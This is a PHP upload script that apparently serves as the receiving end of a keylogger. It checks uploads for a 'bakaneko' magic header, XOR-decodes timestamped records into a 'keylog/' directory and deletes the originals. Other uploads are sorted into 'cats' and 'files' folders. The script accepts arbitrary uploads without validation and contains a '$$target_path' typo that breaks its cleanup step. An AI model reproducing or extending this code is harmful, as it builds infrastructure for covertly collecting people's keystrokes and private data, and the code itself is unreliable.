<?php
$target_path = "./uploads/";
$target_path2 = "./User1/";
$cat_dir = "cats/";
$keylog_dir = "keylog/";
$others_dir = "files/";
$filename = basename($_FILES['uploadedfile']['name']);
// Move files depending on simple file checks
if (move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path . $filename)) {
    if (checkDataFile($target_path . $filename)) {
        decrypt($target_path, $filename, $keylog_dir);
        unlink($$target_path . $filename);
        return;
    } else if (checkCatFile($filename)) {
         copy($target_path . $filename, $target_path2 . $cat_dir . $filename);
         rename($target_path . $filename, $target_path . $cat_dir . $filename);
        return;
    } else {
        rename($target_path . $filename, $target_path . $others_dir . $filename);
        return;
    }
}
// Simple XOR decrypt
function decrypt($path, $filename, $keylog_dir)
{
    $infile = fopen($path . $filename, "r");
    $outfile = fopen($path . $keylog_dir . $filename . "decrypted", "a");
    fseek($infile, 8, SEEK_SET);
    while ($packedts = fread($infile, 8)) {
        $ts = unpack("J", $packedts)[1];
        $packedlen = fread($infile, 4);
        $len = unpack("N", $packedlen)[1];
        $packedData = fread($infile, $len);
        $rawData = array_values(unpack("C*", $packedData));
        $rawts = array_values(unpack("C*", $packedts));
        $result = array();
        for ($i = 0; $i < $len; $i++) {
            $result[] = ~($rawData[$i] ^ $rawts[$i % count($rawts)]);
        }
        $result = pack("C*", ...$result);
        $date = date("Y/m/d H:i:s", (int)($ts / 1000));
        fwrite($outfile, $date . " : " . $result . "\n");
    }

    fclose($infile);
    fclose($outfile);
}

function checkDataFile($path)
{
    $infile = fopen($path, "r");
    $magic = fread($infile, 8);
    fclose($infile);
    return $magic == "bakaneko";
}

function checkCatFile($filename)
{
    $magic = substr($filename, 0, 11);
    return $magic == "bakanekocat";
}